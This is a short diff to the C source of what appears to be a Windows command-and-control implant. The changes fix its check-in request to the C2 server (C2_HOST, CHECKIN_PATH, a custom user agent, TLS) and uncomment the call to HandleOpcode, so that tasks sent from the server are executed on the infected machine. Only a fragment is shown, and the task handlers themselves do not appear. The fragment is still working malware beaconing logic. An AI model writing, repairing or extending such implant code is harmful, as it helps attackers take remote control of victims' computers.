@@ -218,7 +218,7 @@ int RegisterSelf() {
     if (response != NULL) {
         DEBUG_PRINTF("Register Sent!\n");
         free(response);
-        return TRUE;
+        return 0;
     }
     /**
 	if (strcmp((const char *)response, (const char *)REGISTRATION_SUCCESSFUL)){
@@ -244,7 +244,7 @@ BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
 	
     // LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);
 
-	LPBYTE response = HTTPRequest(L"POST", C2_HOST, REGISTER_PATH, C2_PORT, C2_UA				, outboundBuffer, outboundBufferSize, &inboundBufferSize, USE_TLS);
+	LPBYTE response = HTTPRequest(POST_VERB, C2_HOST, CHECKIN_PATH, C2_PORT, C2_UA				, outboundBuffer, outboundBufferSize, &inboundBufferSize, USE_TLS);
     if (response != NULL) {
         DEBUG_PRINTF("Register Sent!\n");
         free(response);
@@ -370,7 +370,7 @@ int main() {
 		
 		if (DoCheckin(&tResp, &tReq) && tReq.TaskID != NULL) {
 			DEBUG_PRINTF("[+] NEW TASK RECIEVED.\n");
-			// HandleOpcode(&tReq, &tResp);
+			HandleOpcode(&tReq, &tResp);
 		} else {
 			// No task to perform, null out the TaskResponse
 			memset(&tResp, 0, sizeof(TaskResponse));
